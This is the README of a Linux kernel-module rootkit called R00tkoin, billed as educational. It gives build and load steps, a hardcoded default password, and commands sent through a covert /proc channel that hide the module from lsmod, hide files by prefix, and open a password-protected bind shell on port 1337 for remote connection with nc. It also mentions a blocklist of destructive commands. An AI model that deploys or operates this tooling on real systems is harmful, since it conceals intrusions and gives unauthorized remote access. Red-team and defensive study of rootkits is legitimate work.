# R00tkoin v1.0

 Loadable Kernel Module (LKM) rootkit made for education purposes only. Designed for authorized security assessments in controlled environments.

## Features

- **Module Stealth**: Hide/unhide module from `lsmod` output
- **File Hiding**: Hide files with configurable prefix from directory listings  
- **Bind Shell**: Password-protected network shell access
- **Stealth Communication**: Covert proc interface for command and control
- **Password Protection**: All operations require authentication
- **Clean Unloading**: Proper resource cleanup and state restoration

## Architecture

R00tkoin uses modern LKM techniques inspired by the [Nuk3Gh0st](https://github.com/juanschallibaum/Nuk3Gh0st) universal rootkit, implementing safe proc-based communication instead of dangerous syscall table manipulation.

### Core Components

- **Command Processor**: Handles authenticated command execution
- **Module Manager**: Controls visibility in kernel module lists
- **File Manager**: Manages file hiding operations
- **Network Manager**: Handles bind shell functionality
- **Communication Interface**: Stealth proc-based C&C channel

## Installation

### Prerequisites

- Linux kernel headers for target system
- GCC compiler with kernel module support
- Root privileges for installation

### Building

```bash
# Clean previous builds
make clean

# Compile the module
make all

# Module will be available at output/r00tkoin.ko
```

### Loading

```bash
# Load the module
sudo insmod output/r00tkoin.ko

# Verify loading (module will be visible initially)
lsmod | grep r00tkoin

# Check communication interface
cat /proc/r00t_comm
```

## Usage

### Communication Interface

All commands are sent through the proc interface using the following format:

```bash
echo 'PASSWORD COMMAND' > /proc/r00t_comm
```

**Default Password**: `r00tkoinFTW1337`

### Available Commands

| Command | Description |
|---------|-------------|
| `hide` | Hide module from lsmod |
| `unhide` | Make module visible in lsmod |
| `filehide` | Enable file hiding (prefix: r00t_) |
| `fileshow` | Disable file hiding |
| `bindshell` | Start bind shell on port 1337 |
| `stopshell` | Stop bind shell |
| `status` | Show current module status |
| `help` | Display available commands |

### Examples

```bash
# Hide the module
echo 'r00tkoinFTW1337 hide' > /proc/r00t_comm

# Enable file hiding
echo 'r00tkoinFTW1337 filehide' > /proc/r00t_comm

# Start bind shell
echo 'r00tkoinFTW1337 bindshell' > /proc/r00t_comm

# Check status
echo 'r00tkoinFTW1337 status' > /proc/r00t_comm

# Monitor kernel logs for responses
dmesg | tail
```

### File Hiding

When file hiding is enabled, files with the `r00t_` prefix will be hidden from directory listings:

```bash
# Create test files
touch r00t_secret.txt normal_file.txt

# Enable file hiding
echo 'r00tkoinFTW1337 filehide' > /proc/r00t_comm

# Files with r00t_ prefix will be hidden
ls -la
```

### Interactive Bind Shell

The bind shell provides **real interactive shell access** with password protection. This executes actual system commands, not simulated responses:

```bash
# Start bind shell
echo 'r00tkoinFTW1337 bindshell' > /proc/r00t_comm

# Connect from local system
nc localhost 1337

# Connect from remote system (network accessible)
nc target_ip 1337

# Authenticate with password
Password: r00tkoinFTW1337

# Real shell commands work:
whoami           # Actual user identification
ps aux           # Real process listing
ls /etc          # Genuine directory listing
cat /proc/version # System information
uname -a         # System details
date             # Current time

# Rootkit-specific commands:
rootkit          # Show rootkit capabilities
status           # Display rootkit status
hidefiles        # Enable file hiding
help             # Show available commands
```

**Safety Features:**
- Command length limits (500 chars max)
- Dangerous command blocking (`rm -rf /`, `shutdown`, etc.)
- Real command execution with output capture

## Testing

Run the comprehensive test suite:

```bash
# Make test script executable
chmod +x test_r00tkoin.sh

# Run all tests
./test_r00tkoin.sh
```

The test suite validates:
- Module loading/unloading
- Stealth communication
- Module hiding functionality
- File hiding operations
- Bind shell activation
- Command processing
- Password protection
- Security validation

## Uninstallation

```bash
# Unload the module (will auto-cleanup)
sudo rmmod r00tkoin

# Verify removal
lsmod | grep r00tkoin
ls /proc/r00t_comm
```

The module automatically restores all modifications during unloading.

## Configuration

Key configuration options in `r00tkoin.c`:

```c
#define R00TKOIN_PASSWORD "r00tkoinFTW1337"  // Authentication password
#define PROC_COMM "r00t_comm"               // Proc interface name
#define HIDE_PREFIX "r00t_"                 // File hiding prefix
#define BIND_PORT 1337                      // Bind shell port
```

## Security Considerations

- **Authorized Use Only**: Only use in authorized penetration tests
- **Controlled Environment**: Deploy only in isolated lab environments
- **Clean Removal**: Always unload properly to avoid system instability
- **Detection**: Modern security tools may detect kernel module activities
- **Logging**: All operations are logged to kernel messages

## Compatibility

- **Kernel Versions**: 4.0+ (tested on 5.4.0)
- **Architectures**: x86_64, i386
- **Distributions**: Ubuntu, Debian

## Educational Purpose

This project is designed for education, blue/red teamers, and security research. It demonstrates  kernel programming techniques and rootkit methodologies in a controlled manner.

## Legal Disclaimer

This software is provided for educational and authorized security testing purposes only. Users are responsible for complying with applicable laws and regulations. The authors assume no liability for misuse or damage caused by this software.

## References

- [Nuk3Gh0st Universal LKM Rootkit](https://github.com/juanschallibaum/Nuk3Gh0st) - Primary inspiration for architecture and techniques


## License

GPL v2 - See LICENSE file for details.

## Author

**sh1dow3r** - Security Researcher

---

*For questions, issues, or contributions, please use the project's issue tracker.* 